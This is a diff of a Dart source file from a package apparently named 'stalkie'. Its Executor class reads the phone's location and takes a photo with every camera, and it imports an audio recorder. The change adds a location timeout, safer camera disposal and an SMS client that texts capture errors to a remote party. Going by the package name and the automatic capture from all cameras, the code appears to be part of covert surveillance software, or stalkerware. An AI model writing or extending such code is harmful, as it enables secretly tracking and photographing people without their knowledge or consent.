@@ -3,24 +3,28 @@ import 'dart:io';
 import 'package:geolocator/geolocator.dart';
 import 'package:camera/camera.dart';
 import 'package:record/record.dart';
+import 'package:stalkie/sms_client.dart';
 
 class Executor {
-  static Future<Position> getLocation() {
-    return Geolocator.getCurrentPosition();
+  static Future<Position> getLocation({Duration? timeout}) {
+    return Geolocator.getCurrentPosition(timeLimit: timeout);
   }
 
   static Future<List<File>> getPhotos() async {
     var cameras = await availableCameras();
     var files = <File>[];
     for (var i in cameras) {
-      var controller = CameraController(i, ResolutionPreset.max);
+      CameraController? controller;
       try {
+        controller = CameraController(i, ResolutionPreset.max);
         await controller.initialize();
         controller.setFlashMode(FlashMode.auto);
         var photo = await controller.takePicture();
         files.add(File(photo.path));
+      } catch (e) {
+        SmsClient.sendSMS("photo from camera ${i.name} error:\n$e)");
       } finally {
-        await controller.dispose();
+        await controller?.dispose();
       }
     }
     return files;
